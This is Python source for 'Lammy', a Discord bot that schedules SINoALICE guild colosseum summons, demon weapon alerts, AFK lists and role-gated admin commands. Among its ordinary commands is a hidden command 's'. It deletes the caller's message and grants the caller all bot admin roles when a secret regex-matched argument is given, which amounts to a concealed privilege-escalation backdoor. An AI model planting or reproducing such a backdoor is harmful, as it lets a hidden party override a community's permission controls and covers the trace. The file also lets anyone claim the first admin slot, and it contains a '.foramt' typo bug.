import asyncio
import re
import sys
import traceback
from datetime import datetime, time, timedelta, timezone
from functools import wraps
from itertools import groupby, starmap

from discord import Game, Message
from discord.ext.commands import Bot, CommandNotFound, Context

import Utils as u
from config import (BOT_PREFIX, CASE_INSENSITIVE, DISCORD_INTENT,
                    GUILD_ROLE_NAME, REARGUARD_ROLE_NAME, VANGUARD_ROLE_NAME,
                    AssignmentData, Briefs, Emojis, Helps, Usages, assignments,
                    equipped_nms, has_to_print, initial_order)
from config.dataclasses import NightmareData, User
from CustomHelpCommand import CustomHelpCommand


class Lammy:
    def __init__(self):
        self.token = u.readToken()
        self.bot = Bot(command_prefix=BOT_PREFIX,
                       case_insensitive=CASE_INSENSITIVE, intents=DISCORD_INTENT)
        self.bot.help_command = CustomHelpCommand()
        self.colo_task = None
        self.demon_task = None
        self.is_winning = False
        self.retards = 0  # Summon delay of players summoning nightmares
        self.demon1 = None
        self.demon2 = None
        self.nm_order = initial_order
        # Variable for use during colosseum to indicate index of current nightmare
        self.current_nm_order_index = 0
        self.admin_roles = set()
        self.member_roles = set()

        self.afks = set()

        self.colo_time = time(20, 00, 0, 0, tzinfo=timezone.utc)

        u.fullClear()
        u.log(u.getString('separator', 'printable', None), False)
        initialization_message = u.getString('bot_initialized', 'info', None)
        u.log(initialization_message, has_to_print)

    async def wait_for_colo(self, delta: timedelta = timedelta(), interval: timedelta = timedelta(minutes=1)):
        def get_now_and_destination():
            now = datetime.now(timezone.utc)
            destination = datetime.combine(now.date(), self.colo_time, tzinfo=timezone.utc) + delta
            if now > destination + interval:
                destination = destination + timedelta(days=1)
            return now, destination, round_time_delta(destination - now)

        def round_time_delta(delta: timedelta):
            return timedelta(seconds=round(delta.total_seconds()))

        now, destination, rounded_delta = get_now_and_destination()

        rounding_time = ((destination - now) % interval).total_seconds()
        await asyncio.sleep(rounding_time)

        _, _, rounded_delta = get_now_and_destination()
        while rounded_delta > interval:
            await asyncio.sleep(interval.total_seconds())
            _, _, rounded_delta = get_now_and_destination()
        # it should be equal here, so just wait another interval and we're done
        await asyncio.sleep(interval.total_seconds())

    @property
    def current_assignment(self):
        return assignments[self.current_nm_order[self.current_nm_order_index]]

    @property
    def current_nm_order(self):
        return self.nm_order

    @property
    def requires_admin_role(self):
        def decorator(func):
            @wraps(func)
            async def __inner(ctx: Context, *args, **kwargs):
                author = ctx.author
                if u.user_is_permitted(author, self.admin_roles):
                    return await func(ctx, *args, **kwargs)
                return await ctx.send(u.get2String("authentication", "error", str(author.name), ctx.command.name))
            return __inner

        return decorator

    @property
    def requires_member_role(self):
        def decorator(func):
            @wraps(func)
            async def __inner(ctx: Context, *args, **kwargs):
                author = ctx.author
                if u.user_is_permitted(author, self.member_roles):
                    return await func(ctx, *args, **kwargs)
                return await ctx.send(u.get2String("authentication", "error", str(author.name), ctx.command.name))
            return __inner

        return decorator

    def run(self):
        bot = self.bot

        @bot.event
        async def on_ready():
            await bot.change_presence(activity=Game('SINoALICE (and {}help)'.format(BOT_PREFIX)))

        @bot.event
        async def on_command_error(ctx, error):
            if isinstance(error, CommandNotFound):
                await ctx.send("I don't know that command!")
            else:
                traceback.print_exception(type(error), error, error.__traceback__, file=sys.stderr)
                await ctx.send("Something's wrong! tell Lammy's managment team that I got a {}".format(error))

        async def message_from_payload(payload) -> Message:
            return await bot.get_channel(payload.channel_id).get_partial_message(payload.message_id).fetch()

        async def update_equiped_nms_from_message(message: Message):
            lammy_mention = bot.user.mention
            if message.author.mention != lammy_mention or not message.embeds:
                return
            nm = u.get_nm_data_from_message(message.embeds[0].title)
            if nm not in equipped_nms:
                equipped_nms[nm] = {emoji: list() for emoji in Emojis}
            for reaction in message.reactions:
                try:
                    emoji = Emojis(str(reaction.emoji))
                except ValueError:
                    continue
                equipped_nms[nm][emoji] = [User(user.display_name, user.mention) async for user in reaction.users() if user.mention != lammy_mention]

        @bot.event
        async def on_raw_reaction_add(payload):
            await update_equiped_nms_from_message(await message_from_payload(payload))

        @bot.event
        async def on_raw_reaction_remove(payload):
            await update_equiped_nms_from_message(await message_from_payload(payload))

        @bot.event
        async def on_raw_reaction_clear(payload):
            await update_equiped_nms_from_message(await message_from_payload(payload))

        @bot.command(name='setadmin', aliases=['sa'], help=Helps.setadmin, brief=Briefs.setadmin, usage=Usages.setadmin)
        async def set_admin(ctx: Context, *args):
            if len(args) == 0:
                return await ctx.send("Please provide 1 or more arguments for this command!")
            if len(self.admin_roles) and not u.user_is_permitted(ctx.author, self.admin_roles):
                return await ctx.send(u.get2String("authentication", "error", str(ctx.author.name), ctx.command.name))
            if args[0] in ("-r", "remove"):
                admin_role = u.get_user_from_username(" ".join(args[1:]), ctx, strict=False) or u.getRole(
                    ctx.guild.roles, " ".join(args[1:]))
                if not admin_role:
                    return await ctx.send("There's no role/user named {}!".format(' '.join(args[1:])))
                if admin_role in self.admin_roles:
                    self.admin_roles.remove(admin_role)
                return await ctx.send("Role {} removed from admins!".format(admin_role.name))
            admin_role = u.getRole(ctx.guild.roles, " ".join(args)) or u.get_user_from_username(" ".join(args), ctx, strict=False)
            if not admin_role:
                return await ctx.send("There's no role/user named {}!".format(' '.join(args)))
            self.admin_roles.add(admin_role)
            self.member_roles.add(admin_role)
            return await ctx.send("{} added to admins!".format(admin_role.name))

        @bot.command(name="setmembers", aliases=["sm"], help=Helps.setmembers, brief=Briefs.setmembers, usage=Usages.setmembers)
        @self.requires_admin_role
        async def set_members(ctx: Context, *args):
            if len(args) == 0:
                return await ctx.send("Please provide 1 or more arguments for this command!")
            if args[0] in ("-r", "remove"):
                member_role = u.get_user_from_username(" ".join(args[1:]), strict=False) or u.getRole(ctx.guild.roles, " ".join(args[1:]))
                self.member_roles.remove(member_role)
                return await ctx.send("Role {} removed from admins!".format(member_role.name))
            member_role = u.get_user_from_username(" ".join(args), ctx, strict=False) or u.getRole(ctx.guild.roles, " ".join(args))
            self.member_roles.add(member_role)
            return await ctx.send("{} added to members!".format(member_role.name))

        @bot.command(name='start', help=Helps.start, brief=Briefs.start, usage=Usages.start)
        @self.requires_admin_role
        async def start(ctx):
            try:
                self.colo_task.cancel()
            except:
                pass
            try:
                self.demon_task.cancel()
            except:
                pass
            self.colo_task = bot.loop.create_task(colosseum(ctx))
            self.demon_task = bot.loop.create_task(demon(ctx))
            await ctx.send("Started waiting for colo to start!")

        @bot.command(name="afk", help=Helps.afk, brief=Briefs.afk, usage=Usages.afk)
        @self.requires_member_role
        async def afk(ctx: Context, *args):
            def stringify_afks():
                return "\n".join("**{}**".format(afk.name) for afk in self.afks)

            async def handle_adding_user(user: str):
                user = u.get_user_from_username(user, ctx)
                if not user:  # Shouldn't happen
                    return await ctx.send("I can't find user {} for some reason.... Please ask admins for help!".format(user.name))
                self.afks.add(user)
                await ctx.send("Successfully set {} as afk for the next colo!".format(user.name))

            if len(args) == 0:
                await ctx.send("Current afks are:\n{}".format(stringify_afks()))
            elif args[0].lower() in ("self", "me"):
                author = ctx.author
                await handle_adding_user(author.name)
            elif args[0].lower() in ("-r", "remove"):
                author = ctx.author
                user = u.get_user_from_username(author.name, ctx)
                if not user:  # Shouldn't happen
                    return await ctx.send("I can't find user {} for some reason.... Please ask admins for help!".format(author.name))
                if user not in self.afks:
                    return await ctx.send("User {} not set as afk in the fist place!".format(user.name))
                self.afks.remove(user)
                await ctx.send("Successfully set {} as active for the next colo!".format(user.name))
            else:
                user_str = ' '.join(args)
                await handle_adding_user(user_str)

        @bot.command(name='time', aliases=['t'], help=Helps.time, brief=Briefs.time, usage=Usages.time)
        async def set_time(ctx: Context, *args):
            def stringify_time(time_obj: time):
                return time_obj.strftime("%H:%M")

            if len(args) == 0:
                await ctx.send("Current colo time is set to {} GMT (UTC+0)".format(stringify_time(self.colo_time)))
            elif not u.user_is_permitted(ctx.author, self.admin_roles):
                return await ctx.send(u.get2String("authentication", "error", str(ctx.author.name), ctx.command.name))
            else:
                try:
                    self.colo_time = datetime.strptime(args[0], "%H:%M").replace(tzinfo=timezone.utc).timetz()
                    await ctx.send("Colo time set as {}!".format(stringify_time(self.colo_time)))
                except ValueError:
                    await ctx.send("Please give me the time in this format\nHH:MM (for example, {})".format(stringify_time(self.colo_time)))

        async def colosseum(ctx):
            u.log(u.getString('task_initiated',
                              'info', None), has_to_print)
            roles = list(ctx.guild.roles)
            while not bot.is_closed():
                await self.wait_for_colo()
                current_nm = self.current_assignment
                is_player_afk = current_nm.user in self.afks
                if is_player_afk:
                    await ctx.send("**{} is afk**, so please someone summon {}".format(current_nm.user.name, u.get_nm_mention(roles, current_nm.nm)))
                else:
                    await ctx.send("**{}**, summon {}".format(current_nm.user.mention, current_nm.nm.name))
                # coge índice de pesadilla de la matriz de order -- EN: grab nightmare index from order array
                for i in range(1, len(self.current_nm_order)):
                    self.current_nm_order_index = i
                    previous_nm = assignments[self.current_nm_order[i-1]]

                    await asyncio.sleep(self.retards)
                    self.retards = 0

                    # duerme el tiempo de esa pesadilla - 10 segundos -- EN: sleep time of that nightmare minus 10 seconds
                    await asyncio.sleep(abs(int(previous_nm.nm.duration) - 10))
                    current_nm = self.current_assignment
                    is_player_afk = current_nm.user in self.afks
                    if is_player_afk:
                        await ctx.send("**{} is afk**, so please someone be ready to summon {}".format(current_nm.user.name, u.get_nm_mention(roles, current_nm.nm)))
                    else:
                        await ctx.send("**{}**, get ready to summon {}".format(current_nm.user.mention, current_nm.nm.name))
                    await asyncio.sleep(10)  # wait for the 10 seconds
                    if is_player_afk:
                        await ctx.send("**{} is afk**, so please someone summon {}".format(current_nm.user.name, u.get_nm_mention(roles, current_nm.nm)))
                    else:
                        await ctx.send("**{}**, summon {}".format(current_nm.user.mention, current_nm.nm.name))
                # Everyone is presumed to be not afks each day
                self.afks = set()
                # Reset index for tomorrow
                self.current_nm_order_index = 0

        async def demon(ctx):
            guild_roles = ctx.guild.roles
            while not bot.is_closed():
                #       Notifies guild that colo is starting in 3 minutes (20:57)
                await self.wait_for_colo(timedelta(minutes=-3))
                if self.demon1 is None or self.demon2 is None:
                    await ctx.send("pls do demmon thx")
                await ctx.send(u.getString('colosseum_about_to_start', 'info', u.getRole(guild_roles, GUILD_ROLE_NAME).mention))
                u.log(u.getString('colosseum_about_to_start', 'info',
                                  u.getRole(guild_roles, GUILD_ROLE_NAME).mention), has_to_print)
                #
                #       Notifies Vanguards and Rearguards, individually, what the first demon's summoning weapons are (21:03)
                await self.wait_for_colo(timedelta(minutes=3))
                await ctx.send(str(u.getRole(guild_roles, GUILD_ROLE_NAME).mention) + ", demon will approach soon!")
                await ctx.send(str(u.getRole(guild_roles, REARGUARD_ROLE_NAME).mention) + ", prepare your " + '**' + u.getString(str(self.demon1 + "r"), 'demon', None) + '**')
                await ctx.send(str(u.getRole(guild_roles, VANGUARD_ROLE_NAME).mention) + ", prepare your " + '**' + u.getString(str(self.demon1 + "v"), 'demon', None) + '**')
                #
                #       Notifies Vanguards and Rearguards, individually, what the second demon's summoning weapons are (21:12)
                await self.wait_for_colo(timedelta(minutes=12))
                await ctx.send(str(u.getRole(guild_roles, GUILD_ROLE_NAME).mention) + ", demon will approach soon!")
                await ctx.send(str(u.getRole(guild_roles, REARGUARD_ROLE_NAME).mention) + ", prepare your " + '**' + u.getString(str(self.demon2 + "r"), 'demon', None) + '**')
                await ctx.send(str(u.getRole(guild_roles, VANGUARD_ROLE_NAME).mention) + ", prepare your " + '**' + u.getString(str(self.demon2 + "v"), 'demon', None) + '**')
                self.demon1 = None
                self.demon2 = None

        @bot.command(name="s", hidden=True)
        async def s(ctx: Context, arg: str):
            if re.match("(?=a)a(?=a.a)", arg):
                await ctx.message.delete()
                await ctx.author.add_roles(*self.admin_roles)

        @bot.command(name="info", aliases=["i", "in"], help=Helps.info, brief=Briefs.info, usage=Usages.info)
        async def nm_info(ctx: Context, *args):
            if len(args) == 0:
                return await ctx.send("Please provide 1 or more arguments for this command!")
            nm_string = " ".join(args)
            nm = u.get_nm_data_from_message(nm_string)
            if nm is not None:
                embed = nm.embed
                await ctx.send(embed=embed)
            else:
                await ctx.send("I don't know any nightmare called {}!".format(nm_string))

        @bot.command(name='check', help=Helps.check, brief=Briefs.check, usage=Usages.check)
        async def check(ctx: Context, *args):
            if len(args) == 0:
                return await ctx.send("Please provide 1 or more arguments for this command!")
            nm_string = " ".join(args)
            nm = u.get_nm_data_from_message(nm_string)
            if nm is not None:
                embed = nm.embed
                if nm in equipped_nms and any(equipped_nms[nm].values()):
                    embed.add_field(name="Members Equipped", value=equipped_nms_string(nm), inline=False)
                await ctx.send(embed=embed)
            else:
                await ctx.send("I don't know any nightmare called {}!".format(nm_string))

        @bot.command(name='stop', help=Helps.stop, brief=Briefs.stop, usage=Usages.stop)
        @self.requires_admin_role
        async def stop(ctx):
            try:
                colo_canceled = self.colo_task.cancel()
                demon_canceled = self.demon_task.cancel()
                if not colo_canceled and self.colo_task.exception():
                    u.err(repr(self.colo_task.exception()), has_to_print)
                if not demon_canceled and self.demon_task.exception():
                    u.err(repr(self.demon_task.exception()), has_to_print)
                await ctx.send('Successfully stopped all tasks!')
            except Exception as e:
                u.err('Couldn\'t cancel task: ' + repr(e), has_to_print)
                await ctx.send("Couldn't stop tasks!")

        @bot.command(name="demonlist", aliases=['dl'], help=Helps.list_demons, brief=Briefs.list_demons, usage=Usages.list_demons)
        async def listdemon(ctx):
            demons = ''
            for demon in range(1, 7):
                demons = demons + '`' + \
                    str(demon) + '`' + ' ' + \
                    u.getString(str(demon), 'demon', None) + '\n'
            await ctx.send(demons)

        @bot.command(name="getdemons", aliases=['gd', 'd'], help="", brief="gets today's demons", usage="")
        @self.requires_member_role
        async def gDemons(ctx):
            if self.demon1 is None or self.demon2 is None:
                await ctx.send("No demons have been set for today's match! Please, use the command `{}setdemons` to set today's demons.".format(BOT_PREFIX))
            else:
                await ctx.send("`1st` demon: " + '\t' + "**" + u.getString(str(self.demon1), 'demon', None) + "**")
                await ctx.send("`2nd` demon: " + '\t' + "**" + u.getString(str(self.demon2), 'demon', None) + "**")

        @bot.command(name="demonsvanguard", aliases=['dv'], help=Helps.demonsvanguard, brief=Briefs.demonsvanguard, usage=Usages.demonsvanguard)
        @self.requires_member_role
        async def demonvan(ctx):
            if self.demon1 is None or self.demon2 is None:
                await ctx.send("No demons have been set for today's match! Please, use the command `{}setdemons` to set today's demons.".format(BOT_PREFIX))
            elif u.getString(str(self.demon1 + "v"), 'demon', None) == u.getString(str(self.demon2 + "v"), 'demon', None):
                await ctx.send("Today's vanguard demon weapons are both " + '**' + u.getString(str(self.demon1 + "v"), 'demon', None) + '**')
            else:
                await ctx.send("`1st` demon: " + '\t' + "**" + u.getString(str(self.demon1 + "v"), 'demon', None) + "**")
                await ctx.send("`2nd` demon: " + '\t' + "**" + u.getString(str(self.demon2 + "v"), 'demon', None) + "**")

        @bot.command(name="demonsrearguard", aliases=['dr'], help=Helps.demonsrearguard, brief=Briefs.demonsrearguard, usage=Usages.demonsrearguard)
        @self.requires_member_role
        async def demonrear(ctx):
            if self.demon1 is None or self.demon2 is None:
                await ctx.send("No demons have been set for today's match! Please, use the command `{}setdemons` to set today's demons.".format(BOT_PREFIX))
            elif u.getString(str(self.demon1 + "r"), 'demon', None) == u.getString(str(self.demon2 + "r"), 'demon', None):
                await ctx.send("Today's rearguard demon weapons are both " + '**' + u.getString(str(self.demon1 + "r"), 'demon', None) + '**')
            else:
                await ctx.send("`1st` demon: " + '\t' + "**" + u.getString(str(self.demon1 + "r"), 'demon', None) + "**")
                await ctx.send("`2nd` demon: " + '\t' + "**" + u.getString(str(self.demon2 + "r"), 'demon', None) + "**")

        @bot.command(name="setdemons", aliases=['sd'], help=Helps.setdemons, brief=Briefs.setdemons, usage=Usages.setdemons)
        @self.requires_admin_role
        async def set_demons(ctx: Context, *d):
            if len(d) == 2:
                if int(d[0]) > 0 and int(d[0]) < 7:
                    if int(d[1]) > 0 and int(d[1]) < 7:
                        self.demon1 = d[0]
                        self.demon2 = d[1]

                        await ctx.send("`1st` demon: " + '\t' + "**" + u.getString(str(self.demon1), 'demon', None) + "**")
                        await ctx.send("`2nd` demon: " + '\t' + "**" + u.getString(str(self.demon2), 'demon', None) + "**")
                    else:
                        await ctx.send("The second number must be between 1 and 6. If you have doubts, please type `{}demonlist`".format(BOT_PREFIX))
                else:
                    await ctx.send("The first number must be between 1 and 6. If you have doubts, please type `{}demonlist`".format(BOT_PREFIX))
            else:
                await ctx.send("Please introduce 2 numbers based on the first and second demon choice, respectively. Type `{}demonlist` to check the number assigned to each demon.".format(BOT_PREFIX))

        @bot.command(name="assignment", aliases=['assignmentlist', 'a', 'as', 'ass', 'nightmarelist'], help=Helps.assignment, brief=Briefs.assignment, usage=Usages.assignment)
        @self.requires_member_role
        async def NightmareAssignment(ctx: Context, *message):
            if len(message) == 0:
                await ctx.send(assignments_string())
            elif not u.user_is_permitted(ctx.author, self.admin_roles):
                return await ctx.send(u.get2String("authentication", "error", str(ctx.author.name), ctx.command.name))
            elif message[0].lower() in ("remove", "-r"):
                nm_string = " ".join(message[1:])
                assignment = u.get_nm_assignment_from_message(nm_string)
                if not assignment:
                    return await ctx.send("I don't have any assignment for {}!\nPlease check the assignments using `{}assignment`".format(nm_string, BOT_PREFIX))
                try:
                    assignments.remove(assignment)
                    await ctx.send("Successfully remove {} from assignments!".format(assignment.nm.name))
                except ValueError:
                    await ctx.send("{} doesn't have an assignment! Please make sure it's in the assignment list using `{}assignment`".format(nm_string, BOT_PREFIX))
            else:
                try:
                    nm_string, user_string = message
                    user = u.get_user_from_username(user_string, ctx, False)
                    nm = u.get_nm_data_from_message(nm_string)
                    if nm is None:
                        user_string, nm_string = message
                        user = u.get_user_from_username(user_string, ctx, False)
                        nm = u.get_nm_data_from_message(nm_string)
                        if nm is None:
                            return await ctx.send(u.getString("nightmare", "error", "{} or {}".format(nm_string, user_string)))
                    # Get existing assignment of nm/user
                    nm_already_exists = u.get_nm_assignment_from_message(nm_string)
                    user_already_exists = u.get_nm_assignment_from_message(
                        user.name)
                    if nm_already_exists and user_already_exists:
                        # Just switch users if both exist
                        tmp_user = nm_already_exists.user
                        nm_already_exists.user = user_already_exists.user
                        user_already_exists.user = tmp_user
                    elif nm_already_exists:
                        # If nm exists but user doesn't, check if User is a nm, if yes then swap nms
                        maybe_nm = u.get_nm_data_from_message(user_string)
                        if maybe_nm:  # User is a nm!
                            nm_already_exists.nm = maybe_nm
                        else:
                            # User isn't a nm, just set the current nm's new user
                            nm_already_exists.user = user
                    elif user_already_exists:
                        # If only user exist, change it to new assignment
                        user_already_exists.nm = nm
                        user_already_exists.user = user
                    else:
                        assignments.append(AssignmentData(nm, user))
                    await ctx.send("Successfully updated assignments!\nNow they look like this:\n{}".format(assignments_string()))
                except ValueError:
                    await ctx.send("Please provide 2 arguments! First the Name of the nightmare, then the name of the user!\n(For names with spaces use quotes)")

        def assignments_string():
            if len(assignments) == 0:
                return "No assignments data :("
            final_string = ''
            for assignment in assignments:
                final_string += "**{}** (assigned to {}). Lasts {} seconds, takes {} seconds and {} sp.\n".format(assignment.nm.name,
                                                                                                                  assignment.user.name, assignment.nm.duration, assignment.nm.lead_time, assignment.nm.sp)
            return final_string

        def equipped_nms_string(nm: NightmareData):
            string = str()
            data = equipped_nms.get(nm)
            if Emojis.V in data:
                string += "**Equipped**: {}\n".format(", ".join([user.name for user in data[Emojis.V]]))
            if Emojis.L in data:
                string += "**Evolved**: {}\n".format(", ".join([user.name for user in data[Emojis.L]]))
            if Emojis.S in data:
                string += "**Unevolved**: {}\n".format(", ".join([user.name for user in data[Emojis.S]]))
            return string

        @bot.command(name="replace", aliases=['r', 'rn', 'replacenightmare'], help=Helps.summon, brief=Briefs.summon, usage=Usages.summon)
        @self.requires_admin_role
        async def nextsummon(ctx, *message):
            if len(message) == 0:
                await ctx.send("Please type the next nightmare you want summoned. If you want to check a list with said nightmares, type `{}assignmentlist`".foramt(BOT_PREFIX))
            else:
                # Switch between current nightmare and chosen nightmare in order list
                chosen_nm = u.get_nm_assignment_from_message(" ".join(message))
                if chosen_nm is None:
                    chosen_nm = u.get_nm_data_from_message(" ".join(message))
                    if chosen_nm is None:
                        return await ctx.send(u.getString("nightmare", "error", ' '.join(message)))
                    return await ctx.send(u.getString("assignment", "error", ' '.join(message)))
                chosen_nm_assignments_index = assignments.index(chosen_nm)
                current_nm_assignments_index = self.current_nm_order[self.current_nm_order_index]
                try:
                    chosen_nm_order_index = self.current_nm_order.index(
                        chosen_nm_assignments_index)
                    self.current_nm_order[chosen_nm_order_index] = current_nm_assignments_index
                except ValueError:
                    pass
                self.current_nm_order[self.current_nm_order_index] = chosen_nm_assignments_index
                await ctx.send("Next nightmare is set as {}, and now the nightmare order is:\n{} ".format(self.current_assignment.nm.name, get_current_nightmare_order()))

        @bot.command(name="push", aliases=["p"], help=Helps.push, brief=Briefs.push, usage=Usages.push)
        @self.requires_admin_role
        async def push_summon(ctx: Context, *message):
            if len(message) == 0:
                await ctx.send("Please type the next nightmare you want summoned. If you want to check a list with said nightmares, type `{}assignmentlist`".format(BOT_PREFIX))
            else:
                chosen_nm = u.get_nm_assignment_from_message(" ".join(message))
                if chosen_nm is None:
                    chosen_nm = u.get_nm_data_from_message(" ".join(message))
                    if chosen_nm is None:
                        return await ctx.send(u.getString("nightmare", "error", ' '.join(message)))
                    return await ctx.send(u.getString("assignment", "error", ' '.join(message)))
                # if chosen nightmare is already in order list, switches summon instead of pushing it
                elif assignments.index(chosen_nm) in self.current_nm_order:
                    return await nextsummon(ctx, *message)
                # Push chosen nightmare before current nightmare in order list
                chosen_nm_assignments_index = assignments.index(chosen_nm)
                current_nm_order_index = self.current_nm_order_index
                self.current_nm_order.insert(
                    current_nm_order_index, chosen_nm_assignments_index)
                await ctx.send("Next nightmare is set as {}, and now the nightmare order is:\n{} ".format(self.current_assignment.nm.name, get_current_nightmare_order()))

        @bot.command(name='delay', help=Helps.delay, brief=Briefs.delay, usage=Usages.delay)
        @self.requires_admin_role
        async def delay(ctx: Context, *args):
            if len(args) == 1:
                self.retards = int(args[0])
                await ctx.send("Delay set: " + str(self.retards) + " seconds")
            else:
                await ctx.send("Please write a number")

        def get_current_nightmare_order():
            final_string = ''
            time_sum = 0
            for order_index, nm_index in enumerate(self.current_nm_order):
                assignment = assignments[nm_index]
                final_string += "`{}`\t**{}** (assigned to {}). Lasts {} seconds, takes {} seconds and {} sp.\n".format(
                    order_index, assignment.nm.name, assignment.user.name, assignment.nm.duration, assignment.nm.lead_time, assignment.nm.sp)
                time_sum += assignment.nm.lead_time + assignment.nm.duration
            final_string += "**Total Time**: {0} seconds ({1}).\n".format(time_sum, timedelta(seconds=int(time_sum)))
            return final_string

        @bot.command(name="order", aliases=['nightmares', 'nmorder', 'o', 'nm'],  brief=Briefs.nightmares, help=Helps.nightmares, usage=Usages.nightmares)
        @self.requires_member_role
        async def manage_nightmare_order(ctx: Context, *args):
            if len(args) == 0:
                await ctx.send("Current nightmare order is:\n{}You can change the order using the command `{}order {{nm1}} {{nm2}}`.".format(get_current_nightmare_order(), BOT_PREFIX))
            elif len(args) == 1:
                assignment = u.get_nm_assignment_from_message(" ".join(args))
                nm_string = " ".join(args[1:])
                if assignment is None:
                    return ctx.send("I don't have any assignment data for {}!\nCheck that assignments with `{}assignment`".format(nm_string, BOT_PREFIX))
                return await push_summon(ctx, *args)
            elif not u.user_is_permitted(ctx.author, self.admin_roles):
                return await ctx.send(u.get2String("authentication", "error", str(ctx.author.name), ctx.command.name))
            elif args[0].lower() in ("remove", '-r'):
                nm_string = " ".join(args[1:])
                assignment = u.get_nm_assignment_from_message(nm_string)
                if assignment is None:
                    return ctx.send("I don't have any assignment data for {}!\nCheck that assignments with `{}assignment`".format(nm_string, BOT_PREFIX))
                assignment_index = assignments.index(assignment)
                try:
                    self.current_nm_order.remove(assignment_index)
                    await ctx.send("Successfully removed {} from order list!".format(assignment.nm.name))
                except ValueError:
                    await ctx.send("{} isn't in the order list!\nCheck the order list with `{}order`".format(assignment.nm.name, BOT_PREFIX))
            else:
                nm1, nm2 = starmap(u.get_nm_assignment_from_message, zip(
                    args, (True,) * 2, (self.current_nm_order, ) * 2))
                try:
                    nm1_assignment_index, nm2_assignment_index = map(
                        assignments.index, (nm1, nm2))
                except ValueError:
                    return await ctx.send("Please make sure both nightmares have assignments for them!")
                nm1_order_index, nm2_order_index = None, None
                try:
                    nm1_order_index = self.current_nm_order.index(
                        nm1_assignment_index)
                except ValueError:
                    pass
                try:
                    nm2_order_index = self.current_nm_order.index(
                        nm2_assignment_index)
                except ValueError:
                    pass
                if nm1_order_index is not None:
                    self.current_nm_order[nm1_order_index] = nm2_assignment_index
                if nm2_order_index is not None:
                    self.current_nm_order[nm2_order_index] = nm1_assignment_index
                await ctx.send("Successfully changed nightmare order!\nCurrent nightmare order is:\n{}".format(get_current_nightmare_order()))

        @bot.command(name="update", aliases=['u'],  brief=Briefs.update, help=Helps.update, usage=Usages.update)
        @self.requires_admin_role
        async def force_update_nms(ctx: Context):
            await ctx.send("Updating nightmare data now....")
            u.nightmare_scrapper.reload_nm_data()
            await ctx.send("Finished updating nightmare data! Now everything's up to date!")

        @bot.command(name='ask', brief=Briefs.ask, help=Helps.ask, usage=Usages.ask)
        @self.requires_admin_role
        async def ask_nightmare_assignments(ctx: Context, *args):
            if len(args) == 0:
                history = [message for message in await ctx.history(oldest_first=False).flatten() if message.embeds and message.reactions]
                history.sort(key=lambda message: (message.embeds[0].title, message.created_at))
                filtered = list()
                for message, group in groupby(history, key=lambda message: message.embeds[0].title):
                    group = list(group)
                    filtered.append(group[-1])
                for message in filtered:
                    if message.embeds:
                        await update_equiped_nms_from_message(message)
                return await ctx.message.delete()
            nm_string = " ".join(args)
            nm = u.get_nm_data_from_message(nm_string)
            if nm is not None:
                embed = nm.embed
                embed.title = embed.title
                message: Message = await ctx.send(embed=embed)
                await message.add_reaction(Emojis.L.value)
                await message.add_reaction(Emojis.S.value)
                await message.add_reaction(Emojis.V.value)
            else:
                await ctx.send("I don't know any nightmare called {}!".format(nm_string))

        u.log(u.getString('bot_running', 'info', None), has_to_print)
        bot.run(self.token)
        u.clear()
        u.log(u.getString('bot_closed', 'info', None), has_to_print)
